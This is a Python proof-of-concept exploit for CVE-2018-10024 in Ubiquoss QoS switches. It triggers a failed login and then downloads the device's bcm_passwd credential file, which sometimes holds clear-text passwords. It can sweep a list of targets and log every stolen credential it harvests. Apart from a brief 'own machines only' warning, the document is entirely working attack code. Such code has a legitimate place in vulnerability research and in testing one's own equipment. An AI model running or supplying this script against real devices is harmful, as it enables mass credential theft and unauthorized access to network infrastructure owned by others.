
# Ubiquoss QoS Switch - bcm_passwd vuln tester (CVE-2018-10024)
# USE IT ONLY IN YOUR OWN MACHINES!!!!

# PoC by Juan Manuel Fernandez (@TheXC3LL)



import argparse
import requests



# Stupid banner is stupid
def banner():
	print "\n-=[ Ubiquoss QoS Switch - bcm_passwd tester (CVE-2018-10024) ]=-\n\n"

# The pwn itself. If you enter a invalid user/pass combination a bcm_passwd file is created 
# This bcm_passwd is the real passwd of the QoS device. And even better: sometimes credentials are in clear-text
# Fuck logic!

def pwn(host):
	print "[+] Let's pwn " + host
	# Try to login with test / test
	print "[+] Trying to login with test / test"
	req = requests.post("http://" + host + "/cgi-bin/login.cgi", data = {'username' : 'test', 'password' : 'test'}, headers={'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'})
	# Is bcm_passwd created?
	print "[+] Testing if bcm_passwd was created"
	req = requests.get("http://" + host + "/cgi-bin/bcm_passwd")
	if req.status_code == 200:
		return req.text 
	else:
		return -1

# Argument parser
parser = argparse.ArgumentParser(description='Ubiquoss QoS Switch - bcm_passwd tester')
parser.add_argument('--target', dest='target', help="Target IP")
parser.add_argument('--list', dest='target_file', help="File with a list of targets")
parser.add_argument('--log', dest='log', help='Optional: filename to save logs')
args = parser.parse_args()

banner()

if not args.target and not args.target_file:
	print "[-] Error: please use -h to see correct syntax"
	exit(-1)


#Yep we can refactor this but... u know xD 
if args.target:
	try:
		pwned = pwn(args.target)
		if pwned != -1:
			print "[+] Pwned!"
			if args.log:
				file = open(args.log, "a")
				file.write(pwned)
				file.close()
			print "\n" + pwned
		else:
			print "[-] Test failed. Not vulnerable."
	except:
		print "[-] Test failed. Is port opened?"

if args.target_file:
	try:
		with open(args.target_file, "r") as data:
			targets = data.read().split("\n")
	except:
		print "[-] Error: file not found or incorrect format."
		exit(-1)
	for x in targets:
		try:
			pwned = pwn(x)
			if pwned != -1:
				print "[+] Pwned!"
				if args.log:
					file = open(args.log, "a")
					file.write("\n" + x + "\n" + pwned + "\n---------\n")
					file.close()
				print "\n" + pwned
			else:
				print "[-] Test failed. Not vulnerable."
		except:
			print "[-] Test failed. Is port opened?"
